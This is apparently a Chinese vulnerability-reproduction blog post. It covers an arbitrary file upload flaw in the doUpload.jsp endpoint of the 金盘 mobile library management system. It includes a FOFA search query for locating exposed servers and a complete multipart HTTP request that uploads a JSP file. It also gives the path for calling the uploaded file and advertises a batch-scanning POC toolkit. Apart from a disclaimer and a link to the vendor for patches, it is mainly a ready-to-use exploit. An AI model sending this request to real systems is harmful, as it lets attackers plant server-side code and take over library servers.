#  金盘移动图书馆系统存在任意文件上传漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-16 21:56  
  
@[toc]  
# 金盘移动图书馆系统存在任意文件上传漏洞 附POC软件  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 金盘移动图书馆系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
金盘移动图书馆管理系统是集掌上门户，掌上APP，微信平台为一体的移动服务解决方案，在移动智能时代拉近读者与图书馆之间的距离。其存在信息泄露漏洞，泄露管理员账号密码等敏感信息  
## 2.漏洞描述  
  
金盘图书馆微信管理平台 doUpload.jsp接口存在任意文件上传漏洞，攻击者通过漏洞可以获取权限。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
金盘移动图书馆管理系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aeny00g6ejXwhZDTkIEIvW2Dl6ylibtlq0UBOAACGe6Q5sMQbKzyjJQpktvVP4mKicHulsiaFYM0xsQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
金盘移动图书馆系统存在任意文件上传漏洞  
## 4.fofa查询语句  
  
app="金盘软件-金盘移动图书馆系统"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/pages/admin/tools/uploadFile/doUpload.jsp  
  
漏洞数据包：  
```
POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Host: 127.0.0.1
Content-Length: 179
Connection: close

--399e563f0389566bd40fd4d6409a67dd
Content-Disposition: form-data; name="file"; filename="jILUp0.jsp.jsp"

<% out.println("lP4pC7HrY"); %>
--399e563f0389566bd40fd4d6409a67dd--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aeny00g6ejXwhZDTkIEIvW2Dl6ylibtlq0UBOAACGe6Q5sMQbKzyjJQpktvVP4mKicHulsiaFYM0xsQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传成功会返回路径，拼接路径即可 http://127.0.0.1/upload/2024-02-15/1708012422565.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aeny00g6ejXwhZDTkIEIvWfE05vrjB7iaiaD1a57x9EHCN90tsnFgia7t0v7CyJ7vFZficjxUChaaRZw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aeny00g6ejXwhZDTkIEIvWGkIxXjKMoCQM8Ip0Jib6l6s0pciaSyrHtc5LKib6uYb4YnjGgz6rOsEtg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aeny00g6ejXwhZDTkIEIvWPXzCmyOymmKgEsLqULTEfAriaoVxyicrdRxiaUfz17mOpJbvZJu3vbvtQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aeny00g6ejXwhZDTkIEIvWYdb69Cotiadko9KdRyaJ15xQ0zaRF6A83lUboE1mLb2LiaYs4Nrzt9Tw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aeny00g6ejXwhZDTkIEIvWria9xCGVibfydCGlMicseTMyewhibDBJw75FuxxLqnzBWzKDYoyxN77PvQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aeny00g6ejXwhZDTkIEIvWicoFVf2ZFIZKdlaibAyf3s6sLV2AACGq5YfVERboiaLIrZ2jA1tzbGfcw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请关注厂商更新补丁：http://www.goldlib.com.cn/  
## 8.往期回顾  
  
[金和OA UploadFileBlock接口存在任意文件上传漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485216&idx=1&sn=0fdeec8a135b1ce0a248d117e96dff89&chksm=974b8a27a03c03311b1410166e9fe0198c5d30318b163e7665c27615f33394580488719a974d&scene=21#wechat_redirect)  
  
  
[大华城市安防监控系统平台attachment_downloadByUrlAtt.action存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485203&idx=1&sn=30e222d7fddfcec5266a3738eadf2b78&chksm=974b8a14a03c0302166d201e8b447b31fc69de59f3ee4670b23b046d7daa45ca533b1900818e&scene=21#wechat_redirect)  
  
  
  
  
